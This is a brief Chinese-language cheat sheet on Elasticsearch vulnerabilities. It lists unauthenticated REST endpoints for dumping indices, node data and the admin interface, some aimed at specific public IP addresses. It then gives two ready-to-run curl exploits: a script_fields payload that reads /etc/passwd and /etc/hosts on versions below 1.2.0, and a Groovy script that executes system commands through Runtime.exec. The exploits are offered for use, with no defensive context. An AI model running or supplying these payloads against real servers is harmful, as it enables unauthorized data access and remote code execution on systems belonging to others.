## elasticsearch 漏洞总结

#### 一、elasticsearch介绍

	ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java语言开发的，并作为Apache许可条款下的开放源码发布，是一种流行的企业级搜索引擎。

#### 二、elasticsearch未授权访问

	http://localhost:9200/_rvier/_search 查看数据库敏感信息
	http://39.105.148.52:9200/_cat/indices 查看集群当前状态
	http://39.105.148.52:9200/_nodes 查看节点数据
	http://39.105.148.52:9200/_plugin/head/  web管理界面

#### 三、elasticSearch < 1.2.0 代码执行漏洞
	curl -XPOST 'http://localhost:9200/_search?pretty' -d '
	{
  		"size": 1,
  		"query": {
    	"filtered": {
      	"query": {
        "match_all": {}
      	}
    	}
  		},
  	"script_fields": {
    "/etc/hosts": {
      "script": "import java.util.;\nimport java.io.;\nnew Scanner(new File(\"/etc/hosts\")).useDelimiter(\"\\Z\").next();"
    },
    "/etc/passwd": {
      "script": "import java.util.;\nimport java.io.;\nnew Scanner(new File(\"/etc/passwd\")).useDelimiter(\"\\Z\").next();"
    }
  	}
	}

#### 四、ElasticSearch Groovy 脚本 远程代码执行漏洞

	curl -XPOST "http://107.170.178.80:9200/_search?pretty" -d'{
    "size": 1, 
    "script_fields": {
        "my_field": {
            "script": "p=Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\").getText()"
        }
    }
	}'

